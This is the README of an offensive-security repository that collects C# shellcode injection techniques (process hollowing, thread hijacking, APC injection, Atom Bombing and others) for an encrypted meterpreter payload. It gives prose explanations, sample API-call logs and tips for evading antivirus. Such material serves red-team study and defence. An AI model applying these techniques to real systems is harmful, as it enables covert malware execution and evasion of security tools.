# Shellcode Injection Techniques
A collection of C# shellcode injection techniques. All techniques use an AES encrypted meterpreter payload.

I will be building this project up as I learn, discover or develop more techniques.

**Note:** The project is not intended to be used as-is. If you are going to use any of the techniques there is a better chance of bypassing AV if you create a smaller, customised project with your chosen technique.

If you do use any of the code in these repositories **keep it legal!**

## Assembly Injection
You can use a [PowerShell assembly injection technique](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/assembly-injection.ps1) if you want to avoid writing .Net binaries to disk.

## Shellcode Runner
[ShellcodeRunner.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ShellcodeRunner.cs) : This technique isn't strictly an injection technique (because we execute the shellcode in the same process) but is the simplest of all techniques. We ensure the shellcode uses a fixed memory location in an `unsafe` context. We change the protection on the page where the shellcode is located so we can execute it. We then use a C# delegate function to execute the shellcode.

```
[+] Using technique: ShellcodeInjectionTechniques.ShellcodeRunner
[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x20D000418E0
[+] Executing shellcode - memory address: 0x20D000418E0
```

## Classic Injection
[ClassicInjection.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ClassicInjection.cs) : This technique allocates memory in the target process, injects the shellcode and starts a new thread.

```
[+] Found process: 24484
[+] Using technique: ShellcodeInjectionTechniques.ClassicInjection
[+] VirtualAllocEx(), assigned: 0x23642220000
[+] WriteProcessMemory() - remote address: 0x23642220000
[+] CreateRemoteThread() - thread handle: 0x380
```

## Thread Hijacking
[ThreadHijack.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ThreadHijack.cs) : This technique hijacks a thread by injection code into the target process, suspends the hijacked thread, sets the instruction pointer (RIP) to our injected code and then resumes the thread.

```
[+] Found process: 11508
[+] Using technique: ShellcodeInjectionTechniques.ThreadHijack
[+] Found thread: 9344
[+] OpenThread() - thread handle: 0x378
[+] VirtualAllocEx(), assigned: 0x1D17AB80000
[+] WriteProcessMemory() - remote address: 0x1D17AB80000
[+] SuspendThread() - thread handle: 0x378
[+] GetThreadContext() - thread handle: 0x378
[+] RIP is: 0x7FFA77D21104
[+] SetThreadContext(), RIP assigned: 0x1D17AB80000
[+] ResumeThread() - thread handle: 0x378
```

## Local Thread Hijacking
[LocalThreadHijack.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/LocalThreadHijack.cs) : This technique creates a new local thread in a suspended state, we then hijack the thread, sets the instruction pointer (RIP) to our injected code and then resume the thread.

```
[+] Using technique: ShellcodeInjectionTechniques.LocalThreadHijack
[+] CreateThread() - thread handle: 0x374
[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x270800418E0
[+] GetThreadContext() - thread handle: 0x374
[+] RIP is: 0x7FFA79EE2630
[+] SetThreadContext(), RIP assigned: 0x270800418E0
[+] ResumeThread() - thread handle: 0x374
```

## Asychronous Procedure Call Injection
[ACPInjection.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/APCInjection.cs) : This technique is similar to the Thread Hijacking technique. We inject the shellcode into a remote thread, then queue an APC object in the thread. When the thread enters an alertable state (when it calls `SleepEx`, `SignalObjectAndWait`, `MsgWaitForMultipleObjectsEx`, `WaitForMultipleObjectsEx`, or `WaitForSingleObjectEx`) it runs our shellcode pointed to by our queued APC object. 

```
[+] Found process: 25320
[+] Using technique: ShellcodeInjectionTechniques.APCInjection
[+] Found thread: 23796
[+] OpenThread() - thread handle: 0x378
[+] VirtualAllocEx(), assigned: 0x24E064D0000
[+] WriteProcessMemory() - remote address: 0x24E064D0000
[+] QueueUserAPC() - thread handle: 0x378
```

## Process Hollowing
[ProcessHollow.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ProcessHollow.cs) : This technique starts another process in the suspended state (svchost.exe), finds the main thread entry point, injects our shellcode into it then resumes the thread.

```
[+] Using technique: ShellcodeInjectionTechniques.ProcessHollow
[+] CreateProcess(): C:\Windows\System32\svchost.exe
[+] Pointer to ImageBase: 0xD31E956010
[+] ReadProcessMemory() - image base pointer: 0xD31E956010
[+] ImageBase: 0x7FF6116C0000
[+] ReadProcessMemory() - svchost base: 0x7FF6116C0000
[+] EntryPoint: 0xD31E956010
[+] WriteProcessMemory(): 0x7FF6116C4E80
[+] ResumeThread() - thread handle: 0x454
```

## Inter-Process Mapped View
[InterProcessMappedView.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/InterProcessMappedView.cs) : This technique creates a new section in memory, creates a local mapped view of the section, copies our shellcode into the local mapped view and creates a remote mapped view of the local mapped view in the target process. Finally we create a new thread in the target process with the mapped view as the entry point.

```
[+] Found process: 23740
[+] Using technique: ShellcodeInjectionTechniques.InterProcessMappedView
[+] NtCreateSection() - section handle: 0x37C
[+] NtMapViewOfSection() - local view: 0x20CB8E40000
[+] Marshalling shellcode
[+] NtMapViewOfSection() - remote view: 0x22D90310000
[+] RtlCreateUserThread() - thread handle: 0x384
```

## Atom Bombing
[AtomBomb.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/AtomBomb.cs) : This technique is interesting in how we write shellcode to the target process. We use the Global Atom Table which allows us to write null terminated strings with a maximum size of 255 bytes. We find a code cave to write our shellcode to, then use APC calls to trigger the target process to read the Atom Names into memory. Finally we use a couple of APC calls to change the memory protection of the target and execute the shellcode.

My code differs from the original [Atom Bombing](https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows) technique, written in C/C++. First, I chain Atom Names together, using multiple APCs, to form a shellcode of larger than 255 bytes. I don't use ROP chains to force the target process to call `VirtualProtect` and then execute the code, I use the APC queue.

This code requires the main thread to enter an alertable state in order to execute the APC queue and I do not clean up after the shellcode execution, the target process becomes unstable. I plan to improve on this technique (by seraching for alertable threads and cleaning up afterwards), but as a PoC it works well.

```
[+] Found process: 14140
[+] Using technique: ShellcodeInjectionTechniques.AtomBomb
[+] Found thread: 5940
[+] OpenThread() - thread handle: 0xD0
[+] FindWritablePages() - number found: 2
[+] Found a suitable code cave - pWritable: 0x2CE60031
[+] GetProcAddress() - pGlobalGetAtomNameW: 0x7FFE20EB2680
[+] GlobalAddAtom() - ATOM: 0xC091
[+] NtQueueApcThread() - pWritable: 0x2CE60031
[+] GlobalAddAtom() - ATOM: 0xC06F
[+] NtQueueApcThread() - pWritable: 0x2CE600F9
[+] GlobalAddAtom() - ATOM: 0xC080
[+] NtQueueApcThread() - pWritable: 0x2CE601C1
[+] GlobalAddAtom() - ATOM: 0xC088
[+] NtQueueApcThread() - pWritable: 0x2CE60289
[+] GlobalAddAtom() - ATOM: 0xC084
[+] NtQueueApcThread() - pWritable: 0x2CE60351
[+] GetProcAddress() - pVirtualProtect: 0x7FFE20EBBC70
[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x2CE60031
[+] QueueUserAPC() - codeCave: 0x2CE60031
```

## Notes
The Atom Bombing technique places null terminated strings in the Global Atom Table, this means you must use shellcode that doesn't have 0x00 characters in it.

Remember you will need to start a process to inject to, except when using the shellcode runner, local thread hijack technique or the process hollowing technique (this technique starts a new process in the suspended state).

```
[!] Unable to find process to inject into!
```

When using the shellcode runner, local thread hijack technique or the process hollowing technique you will need to comment out the code in `Program.cs` that looks for the process to inject into:

```csharp
/*
Process[] processes = Process.GetProcessesByName("notepad");

if(processes.Length == 0)
{
  Debug("[!] Unable to find process to inject into!");
  return;
}

Debug("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
target = processes[0];
*/
```
